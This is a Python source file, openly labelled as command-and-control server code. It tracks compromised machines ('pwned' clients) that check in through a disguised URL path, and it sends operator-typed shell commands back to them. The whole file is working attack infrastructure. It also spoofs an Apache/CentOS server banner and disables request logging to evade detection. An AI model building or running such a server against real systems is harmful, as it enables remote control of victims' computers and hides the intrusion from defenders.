#!/bin/python3
"""
C2 Server side code
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
from enum import Enum

class HTTPStatusCode(Enum):
    OK = 200
    CREATED = 201
    NO_CONTENT = 204
    BAD_REQUEST = 400
    UNAUTHORIZED = 401
    FORBIDDEN = 403
    NOT_FOUND = 404
    INTERNAL_SERVER_ERROR = 500

PORT = 8900
# Leave blank to bind to all int otherwise specify c2 server IP address
BIND_ADDR = ""
CMD_REQUEST = "/student?isbn="

class C2Handler(BaseHTTPRequestHandler):
    """ This is a child class of the BaseHTTPRequestHandler class.
    It handles all HTTP request of our C2 server. """
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"
    
    # noinspection PyPep8Naming
    def do_GET(self):
        global active_session, client_account, client_hostname, pwned_id, pwned_dict
        # compromised computer request exfiltrate datas
        if self.path.startswith(CMD_REQUEST):
            client = self.path.split(CMD_REQUEST)[1] 
            
            # client not into our pwned_dict yet
            if client not in pwned_dict.values():
                self.http_response(HTTPStatusCode.OK.value)

                pwned_id += 1
                pwned_dict[pwned_id] = client
                client_account = client.split('@')[0]
                client_hostname = client.split('@')[1]

                print(f"{client_account}@{client_hostname} has been pwned!\n")

            # interactive session with client
            elif client == pwned_dict[active_session]:
                cmd = input(f"{client_account}@{client_hostname}: ")
                self.http_response(HTTPStatusCode.OK.value)
                # passing back command to client; must be utf-8 encode
                self.wfile.write(cmd.encode())

            # if client is in pwned_dict but is not our active session
            else:
                # first send back 404 to the client
                self.http_response(HTTPStatusCode.NOT_FOUND.value)
                
    def http_response(self, code: int):
        self.send_response(code)
        self.end_headers()

    
    def log_request(self, code = "-", size = "-"):
        """ rewrite log to just keep interesting datas into c2 request tracks """
        return 

active_session = 1
client_account = ""
client_hostname = ""
pwned_id = 0
pwned_dict = {}

print("server version:", C2Handler.server_version)
print("sys_version:", C2Handler.sys_version)

server = HTTPServer((BIND_ADDR, PORT), C2Handler)
server.serve_forever()
# def run(server_class=HTTPServer, handler_class=BHTTPR):
#     server_address = ('', 8900)
#     httpd = server_class(server_address, handler_class)
#     httpd.serve_forever()